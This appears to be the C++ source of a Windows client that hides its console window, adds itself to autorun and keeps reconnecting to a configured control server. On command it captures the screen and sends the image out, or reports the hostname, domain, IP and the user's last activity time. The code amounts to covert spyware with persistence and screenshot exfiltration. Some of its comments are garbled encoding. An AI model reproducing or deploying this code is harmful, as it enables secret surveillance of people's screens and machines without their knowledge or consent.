#include <iostream>
#include "Client.h"
#include "ConfigReader.h"
#include "OS.h"
#include "Screenshoter.h"
#include <regex>

using namespace std;

string server_ip;
int server_port;

string screenshot_dir;
string host_name;
string host_domain_name;
TCPClient* client;

map<string, string> conf;

void sendScreenshot() {
    Screenshoter scrsht;
    unsigned int size = 0;
    string screen_path = scrsht.makeScreenshot(screenshot_dir);
    char* data = scrsht.screenshotToMemory(screen_path, &size);
    Sleep(2); client->sendMessage(to_string(size)); // ��������� ������
    Sleep(2); auto msg = client->receiveMessage();             // �������� ������
    if (msg != to_string(size)) {
        throw exception("");
    }
    Sleep(2); client->sendMessage(data, size);      // ��������� ����
    Sleep(20);
    scrsht.freeMemory(data);                        // ��������� �� ������ ����
}

void useConfig(string path) {
    ConfigReader cr;
    conf = cr.read(path);

    server_ip = conf["control_server"].substr(0, conf["control_server"].find(":"));
    server_port = atoi(conf["control_server"].substr(conf["control_server"].find(":") + 1).c_str());

    screenshot_dir = regex_replace(OS::getExecProgramPath(), regex("\\\w*\.exe"), conf["screenshot_dir"]);

    host_name = OS::getPCName();
    host_domain_name = OS::getPCDomain();

    if (host_domain_name.length() == 0) {
        host_domain_name = "no domain";
    }
}

void sendState() {
    string info = "";
    info += "hostname: " + host_name + "\n";
    info += "domain: " + host_domain_name + "\n";
    info += "last_activ_time: " + OS::getLastUserActivityTime() + "\n";
    info += "ip: " + OS::getHostIp() + "\n";
    client->sendMessage(info);
}

int main() {
    FreeConsole(); // ��������� ����������� ��� �������

    client = nullptr;
    OS::addProgramToAutorun("Exe", OS::getExecProgramPath());
    auto programPath = OS::getExecProgramPath();
    auto confPath = regex_replace(programPath, regex("\\\w*\.exe"), "config.txt");
    useConfig(confPath);
   
    while (true) {
        try {
            Sleep(1000);
            client = new TCPClient(server_ip, server_port);
            client->connect();
        } catch (exception) {
            if (client != nullptr)
                delete client;
            continue;
        }

        while (true) {
            try {
                string command = client->receiveMessage();
                if (command == "GET_SCREENSHOT")
                    sendScreenshot();
                else if (command == "GET_STATE") {
                    sendState();

                }
            }
            catch (exception e) {
                delete client;

                break;
            }
        }

    }
}